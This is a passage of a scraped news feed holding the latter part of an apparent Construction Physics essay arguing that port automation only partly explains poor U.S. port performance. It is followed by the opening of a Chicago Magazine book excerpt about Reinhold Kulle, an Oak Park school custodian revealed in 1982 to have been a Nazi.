href="https://www.marineinsight.com/marine-safety/important-points-for-safe-container-lashing/" rel="">lashing</a><span> (which also includes installing tie-rods and turnbuckles). Lashing is a difficult process to automate (though automated twistlocks </span><a href="https://www.youtube.com/watch?v=euYwMviOuYo" rel="">do exist</a><span>), and it is </span><a href="https://portlogistics.akquinet.com/port-logistics-blog/blogpost-details/automatic-twistlock-handling-what-are-the-possibilities" rel="">mostly done manually</a><span>, even in highly automated ports.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png" width="1140" height="500" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8451d681-6337-45ff-958f-6911acbd889b_1140x500.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:500,&quot;width&quot;:1140,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8451d681-6337-45ff-958f-6911acbd889b_1140x500.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Container twistlock.</figcaption></figure></div><p><span>Containers are moved on and off ships using large </span><a href="https://www.liebherr.com/en/usa/products/maritime-cranes/port-equipment/container-bridges/ship-to-shore-container-cranes.html#:~:text=Ship%20to%20shore%20container%20cranes%20are%20custom%20designed%20with%20a,twin%20and%20tandem%20lift%20configuration." rel="">ship-to-shore cranes</a><span>. While some parts of this process </span><a href="https://www.porttechnology.org/wp-content/uploads/2019/05/PT50-21.pdf" rel="">can be automated</a><span>, skilled workers are still required to align the cranes with the container, in part because the ship is moving slightly as containers are being picked. Traditionally these cranes were operated from cabs attached to the crane itself, though some ports are installing systems that allow for remote operation.</span></p><p><span>Unloaded containers will typically be moved to a storage yard, using a range of types of vehicles. Some, like regular trucks, move horizontally, while others, like </span><a href="https://www.konecranes.com/en-us/port-equipment-services/container-handling-equipment/straddle-carriers" rel="">straddle carriers</a><span>, can both move it horizontally and lift the container to stack it. These operations can be automated using </span><a href="https://www.konecranes.com/en-us/port-equipment-services/container-handling-equipment/automated-guided-vehicles" rel="">automated guided vehicles</a><span> (AGVs) and </span><a href="https://www.kalmarusa.com/equipment/straddle-carriers/autostrad-automated-straddle-carrier/" rel="">automated lifting vehicles</a><span> (ALVs).</span></p><p><span>Containers in the storage yard will be moved around either via lifting vehicles or by large gantry cranes. Gantry cranes come in two types: either </span><a href="https://aicraneliftingsolution.com/gantry-cranes/rail-mounted/amp/" rel="">rail mounted</a><span> (called RMGs) or equipped with </span><a href="https://www.konecranes.com/en-us/port-equipment-services/container-handling-equipment/rubber-tired-gantry-cranes" rel="">large rubber tires</a><span> that allow them to move without needing rails (called RTGs). Both types of cranes can also be automated.</span></p><p>From the yard, containers are moved out of the port onto land via trucks or rail. Containers must be checked at the port gate, and parts of these gate-checking operations can also be automated using things like radiofrequency ID (RFID) and optical character recognition (OCR) systems to automatically track and update container movements.</p><p>When a container port is referred to as “automated,” it typically means it has adopted container-moving technologies like automated guided vehicles and straddle carriers, automated gantry cranes, and remotely operated ship-to-shore cranes. Lashing is still mostly done manually even in automated ports, and even “un-automated” ports (including most large ports in the U.S.) have adopted gate automation systems.</p><p><span>Does automating container handling improve port productivity? It’s not clear that it does, or that the lack of it is why U.S. ports perform so poorly. For one thing, few ports around the world have adopted this sort of automation. As of 2021 there were around 63 automated or semi-automated container terminals in the world out of more than 1,300 container terminals total, accounting for only about 4% of global container capacity. Where automation has been adopted, it’s often limited to a single container terminal out of </span><a href="https://www.portoflosangeles.org/business/terminals/container" rel="">many in a given port</a><span>, each operated by different companies.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png" width="1392" height="680" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:680,&quot;width&quot;:1392,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F86125dea-ff3f-4d3a-a501-6bc0de9c2dd4_1392x680.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>Automated container terminals circa 2021. Each dot represents an existing or planned automated terminal. Via </span><a href="https://www.pmanet.org/terminal-automation-in-southern-california-implications-for-growth-jobs-and-the-future-competitiveness-of-west-coast-ports/" rel="">PMA</a><span>.</span></figcaption></figure></div><p>Several of these automated terminals are in the U.S. Los Angeles, for instance, has two automated terminals, and its sister port of Long Beach has another. On a country-by-country basis, in fact, the U.S. is towards the higher end in the number of automated or semi-automated container terminals it operates.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png" width="912" height="440" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/a86d856e-185a-41b9-a633-647ab92ded28_912x440.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:440,&quot;width&quot;:912,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa86d856e-185a-41b9-a633-647ab92ded28_912x440.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>Automated container terminals by country circa 2022, via </span><a href="https://www.porteconomics.eu/container-terminal-automation-a-global-analysis-on-decision-making-drivers-benefits-realized-and-stakeholder-support/" rel="">Knatz et al</a><span>.</span></figcaption></figure></div><p>The ports that have adopted automation aren’t necessarily particularly efficient. Rotterdam was one of the first ports to automate (its first automated terminal opened in 1993), and today it’s one of the most heavily automated ports in the world, but its port performance ranking is just #91, one point above the comparatively less automated New York, and far below the un-automated ports of Charleston and Philadelphia (#53 and #55 respectively). Likewise, the U.S.’s most automated port, Los Angeles, comes in very close to the bottom of the worldwide rankings, while the top two ports on the list (Yangshan in China and Salalah in Oman) have just one and zero automated terminals, respectively.</p><p><span>Other analyses likewise point to a complex relationship between automation and efficient port operations. A </span><a href="https://www.mckinsey.com/industries/travel-logistics-and-infrastructure/our-insights/the-future-of-automated-ports#/download/%2F~%2Fmedia%2Fmckinsey%2Findustries%2Ftravel%20logistics%20and%20infrastructure%2Four%20insights%2Fthe%20future%20of%20automated%20ports%2Fthe-future-of-automated-ports-final.pdf%3FshouldIndex%3Dfalse" rel="">McKinsey survey</a><span> from 2017 found that while port automation reduced labor costs, it actually </span><em>reduced</em><span> port productivity between 7 and 15%, and the labor savings weren’t necessarily enough to justify the investment. A </span><a href="https://www.itf-oecd.org/container-port-automation-impacts-and-implications" rel="">2021 OECD report</a><span> similarly found that “automated ports are generally not more productive than their conventional counterparts,” and a </span><a href="https://www.gao.gov/products/gao-24-106498" rel="">2024 GAO report</a><span> also noted that both U.S. and international ports found “mixed effects” on performance when adopting automation. APM Terminals, a global container terminal operator, stated in 2021 that its fully automated terminal in Rotterdam (Maasvlakte 2) had lower performance than its older, non-automated terminal (Maasvlakte 1). A </span><a href="https://www.porteconomics.eu/container-terminal-automation-a-global-analysis-on-decision-making-drivers-benefits-realized-and-stakeholder-support/" rel="">2021 survey</a><span> of automated port operators found that while port operators did generally receive benefits they expected from automation, they were somewhat prone to overestimating the reduction in container handling costs (though they also underestimated the benefits to things like truck turn time).</span></p><p><span>Why is port automation not a more obvious win? A variety of factors are at work. For one, automated container handling equipment is not always as capable as manual handling. The GAO survey of automated port operators found that while automated equipment had benefits like being able to stack containers closer and sometimes needing fewer container moves, it was sometimes slower and less capable than conventional equipment, even after several years of operation. Automated cranes might make fewer crane moves per hour due to inability to operate in adverse weather conditions, like rain or fog, that a human could handle. When the Port of Auckland tried to adopt automated handling equipment, automated straddle carriers were found to operate at just one third the speed of manual ones, and often behaved unsafely and unpredictably. Auckland ultimately abandoned its automation project after spending $400 million (and losing hundreds of millions more due to shipping delays), and is now </span><a href="https://www.stuff.co.nz/nz-news/350189426/auckland-port-revives-machines-failed-automation-project" rel="">converting</a><span> its automated straddles to manual. The performance of remotely operated cranes has sometimes been disappointing for similar reasons. </span></p><p><span>Automated equipment is less flexible than a human operator, and it can’t respond to unusual or unexpected situations that a human could handle; AGVs, for instance, often follow fixed paths guided by </span><a href="https://www.goetting-agv.com/dateien/downloads/ptn_article.pdf" rel="">transponders</a><span> </span><a href="https://www.youtube.com/watch?v=NULoelb7PzA" rel="">embedded</a><span> in the concrete. And automation does best with a steady, predictable volume of containers. But as container ships have gotten larger, container volumes have often gotten </span><em>less</em><span> steady, with more peaks and troughs. Highly varying volumes might be more easily handled by a human labor force that can be scaled up and down as needed.</span></p><p>Relatedly, it’s typically easier to install automated equipment in a new, greenfield container terminal than to retrofit an existing terminal. Union work rules that limit labor flexibility might also make it hard to take maximum advantage of automated equipment. These last two factors are likely part of the reason why Chinese ports tend to see greater advantage from automation than U.S. ports.</p><p><span>Container unloading and transport is a long sequence of operations, of which only some can be addressed by automation. If your operations aren’t carefully synced, or they’re bottlenecked by some other factor unrelated to automation (such as the availability of truck chassis), then automation can’t do much to help. Conversely, carefully synchronizing operations to minimize waiting and waste doesn’t require automation to achieve. In 2013, the best-performing container terminal in the world was a non-automated APM terminal in the Japanese port of Yokohama. It achieved this via good old fashioned </span><a href="https://mag.toyota.co.uk/kaizen-toyota-production-system/" rel="">continuous improvement</a><span> methods to cut out as much waiting as possible.</span></p><p>Automated equipment reduces unit costs of container handling, but this reduction can be offset by the high upfront costs needed to install the equipment. A survey of automated port operators found that payback periods were most often 6 years or more, and some U.S. operators expected payback periods of 10 to 20 years. This makes automation risky if the expected future container volumes don’t materialize, and automation tends to be easiest to justify in very large ports with large container volumes.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png" width="1456" height="871" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/de98017a-853a-4171-8dd3-8168f05e1153_1464x876.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:871,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fde98017a-853a-4171-8dd3-8168f05e1153_1464x876.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Via GAO.</figcaption></figure></div><p>Large volumes might also be needed for the productivity benefits of automation to materialize. APM Terminals stated in 2021 that its Maasvlakte 2 Terminal was too small to fully achieve the benefits from automation:</p><blockquote><p><em>“The high degree of automation only comes into its own when large volumes can be rotated, and these are insufficient at this time. Sometimes, processes are still carried out manually, which should actually be automated. If the terminal is expanded, with the same staffing, more volume is processed, and productivity goes to the intended level.”</em></p></blockquote><p>In addition to the factors of scale, greenfield vs. brownfield sites, and work rules that make it harder for U.S. ports to take maximum advantage of automation (and to generally operate efficiently), there are other factors that drag down American port performance.</p><p><span>One factor is the type of work ports are doing. Most U.S. ports are “</span><a href="https://porteconomicsmanagement.org/pemp/contents/part1/ports-and-container-shipping/levels-transshipment-incidence/" rel="">gateway</a><span>” ports, where imports enter the country and exports leave via land-based travel like rail and trucks. By contrast, some ports that act as hubs for global trade do much more </span><a href="https://en.wikipedia.org/wiki/Transshipment" rel="">transhipment</a><span>, where containers arrive on one ship and depart on another. Singapore, for instance, has one of the largest ports in the world, but very little of the cargo is Singaporean imports and exports.</span></p><p><span>Transhipment cargo tends to take less time to move, and ports that have a large fraction of transhipment will naturally have higher performance as measured by vessel waiting time. On the Container Port Performance Index, many of the top-performing ports, like </span><a href="https://asyad.om/ports/salalah-port" rel="">Salalah</a><span>, </span><a href="https://www.seatrade-maritime.com/ports-logistics/cartagena-is-the-largest-transhipment-hub-in-the-caribbean" rel="">Cartagena</a><span>, and </span><a href="https://maritime-executive.com/article/maersk-expands-tangiers-med-terminal-as-port-s-transshipment-role-grows" rel="">Tanger-Med</a><span>, are primarily transhipment ports. (Of course, the Jones Act makes it hard for the U.S. to take advantage of transhipment for domestic cargoes.) High transhipment fractions may also make it easier to adopt automated equipment, though experts seem to disagree about this.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-149929827" href="https://www.construction-physics.com/p/do-us-ports-need-more-automation#footnote-1-149929827" target="_self" rel="">1</a></span></p><p>Another major performance factor is hours of operation. Top-performing ports tend to operate 24 hours a day, 7 days a week, whereas U.S. ports don’t operate around the clock.</p><p><span>The limited hours of operation relate to another potential issue, that of lack of coordination. As we noted, effective container handling requires all operations to be coordinated and synchronized, and there’s some evidence that American ports don’t coordinate their operations especially well. In Los Angeles and Long Beach, for instance, individual terminals have separate rail systems for moving cargo, and the systems don’t work together. Lack of coordination between truckers, shipyards, and companies that move containers also seems to be behind the failure of a </span><a href="https://ambrook.com/research/supply-chain/ag-exports-bottlenecked-at-oakland-port-despite-usda-efforts" rel="">program</a><span> designed to help farmers ship out crops through the Port of Oakland. Historically, U.S. ports have </span><a href="https://www.joc.com/article/us-ports-move-toward-truck-appointment-model-5238478" rel="">lacked appointment systems</a><span> for trucks to arrive and pick up cargo; instead trucks would simply arrive randomly, often creating large amounts of congestion as they waited to load and unload. And while U.S. ports seem to be adopting truck appointment systems, they don’t yet appear to be universal or completely coordinated (as of last year the ports of Los Angeles and Long Beach had </span><a href="https://www.truckingdive.com/news/california-harbor-trucking-association-port-of-long-beach-port-of-los-angeles-appointments-system/641644/" rel="">several different appointment systems</a><span> in place). During the post-pandemic cargo congestion at major ports, things like </span><a href="https://www.reuters.com/world/us/us-ports-supply-chain-fix-challenge-selling-247-shifts-2021-10-14/" rel="">lack of available warehouse space</a><span> made temporary 24/7 port operations less than successful. There are often shortages of </span><a href="https://www.foodlogistics.com/transportation/3pl-4pl/news/12090302/ports-and-truckers-face-chassis-shortage" rel="">truck chassis</a><span> or </span><a href="https://www.kanarysolutions.com/resources/what-is-causing-port-congestion" rel="">truck drivers</a><span> needed to move containers out of ports, and </span><a href="https://crsreports.congress.gov/product/pdf/IN/IN11800" rel="">customs processes are often slow</a><span> and not coordinated.</span></p><p><span>Another possible issue is infrastructure investment not keeping up with port container volumes, an issue highlighted in a 2015 Federal Maritime Commission Study. One example of this is </span><a href="https://www.heritage.org/trade/commentary/113-year-old-law-hurting-american-ports" rel="">insufficient dredging</a><span> to handle larger container ships (a problem made worse by the Foreign Dredge Act, which prevents the use of foreign-built dredges). Most American ports </span><a href="https://transportgeography.org/contents/chapter6/port-terminals/channel-depth-ports-north-america/" rel="">can’t handle</a><span> the very largest container ships. In 2021 a </span><a href="https://enotrans.org/article/port-of-long-beach-highlights-dredging-project-in-tis-wrda-hearing/" rel="">24,000-TEU container ship</a><span> needed to unload its cargo to a smaller ship at the Port of Long Beach, which then transferred its cargo ashore, a time-consuming operation required because the Bay was not deep enough to allow the larger ship to access the port.</span></p><p>Automation, at best, seems like a partial explanation of American port productivity problems. The U.S. is not necessarily all that far behind in automated equipment adoption, and it’s not as clear a win as some people seem to think. Plenty of automated ports (including American ones!) don’t operate particularly efficiently, and plenty of non-automated ports do.</p><p>Of course, this doesn’t mean that the union is correct to ban all automation going forward. Right now, automation is the worst that it will ever be. It will only get better and more capable, and banning it will hamstring port efficiencies in the future even if it doesn’t necessarily do it now. It’s hard to imagine how much poorer the U.S. (and the world) would be if unions had successfully fought off the introduction of the shipping container in the 1960s. We shouldn’t stop the introduction of new, productivity-enhancing technology, but we should also be realistic about what benefits it will actually be expected to yield.</p><p><em><strong><span>If you’re interested in learning more about port automation, a recommended reading list of the best and most useful sources I found is </span><a href="https://open.substack.com/pub/constructionphysics/p/port-automation-reading-list?r=23el8&amp;utm_campaign=post&amp;utm_medium=web" rel="">available here</a><span> for paid subscribers.</span></strong></em></p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Nazi of Oak Park (110 pts)]]></title>
            <link>https://www.chicagomag.com/chicago-magazine/september-2024/the-nazi-of-oak-park/</link>
            <guid>41776721</guid>
            <pubDate>Tue, 08 Oct 2024 12:41:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.chicagomag.com/chicago-magazine/september-2024/the-nazi-of-oak-park/">https://www.chicagomag.com/chicago-magazine/september-2024/the-nazi-of-oak-park/</a>, See on <a href="https://news.ycombinator.com/item?id=41776721">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                
<div><p><img decoding="async" src="https://www.chicagomag.com/wp-content/uploads/2024/08/kulle-book.jpg"></p><p>Adapted from <em>Our Nazi: An American Suburb’s Encounter With Evil</em> by Michael Soffer, with permission from the University of Chicago Press. © 2024 by the University of Chicago. All rights reserved.</p></div>



<p>Jack Swanson walked into his second-floor office at Oak Park and River Forest High School. It was December 4, 1982, and this three-room suite next to the boardroom had been his for the last eight years, after he had beaten out 60 other administrators vying to run the storied west suburban school. The normally bustling building was quiet, the 3,400 students enjoying the unseasonably warm Saturday at home.</p>



<p>Swanson exuded calm and professionalism. Deeply religious, he was in some ways a throwback to Oak Park’s more genteel past, when the village was informally known as Saints’ Rest. When he first took the reins at the school, Swanson had streamlined its administrative structure, and had told the local papers that he wanted to ensure that Oak Park was a “viable community” for people from diverse backgrounds.</p>



<p>Oak Parkers had always felt there was something special about their town. It had raised Ernest Hemingway and was home to a dozen of Frank Lloyd Wright’s iconic Prairie-style structures. Oak Parkers’ pride was reflected even in the high school’s motto: “Those Things That Are Best.” The village no longer resembled the conservative community that Hemingway once quipped had “wide lawns and narrow minds.” Oak Park had become a national model for integration, recognized by the National Civic League as an All-America City at the end of Swanson’s first year.</p>



<p>Trim and dignified, the 54-year-old superintendent readied for a quiet morning of paperwork. Outside his window, large Victorian homes sat across sleepy Scoville Avenue. Swanson settled into his chair and opened the <em>Chicago Sun-Times</em>.</p>



<p>A headline on the bottom right-hand corner of page 7 caught his eye: “Deportation Bid on Suburb Man.”</p>



<p>He scanned the article, and a wave of shock rushed over him. It had to be a misprint, some kind of misunderstanding. Maybe it was a different man with the same name? No, the <em>Sun-Times</em> left no room for doubt.</p>



<p>Swanson fumbled for his phone and dialed school board president Paul Gignilliat, unsure of what exactly he would say.</p>



<p>Gignilliat was relaxing at his home two blocks away when his phone pierced the morning quiet.</p>



<p>“Have you noticed?” Swanson bellowed. The next few seconds were a blur, the words almost impossible to believe. But Swanson wanted Gignilliat to hear the news from him directly: Reinhold Kulle, the high school’s chief custodian, had been a Nazi.</p>





<p><span>I</span>t was 1957, and the U.S. Consulate in Frankfurt, Germany, was abuzz with activity. Katherine Geoghegan, one of the consulate’s veteran officers, ushered a new visa applicant and his family into her office. A physician had just examined them, drawing their blood and listening to their hearts.</p>



<p>This interview was the final step in the monthslong process. It was exciting and nerve-racking for the applicants, but routine by now for Geoghegan. She placed the applicants under oath and offered them a seat.</p>



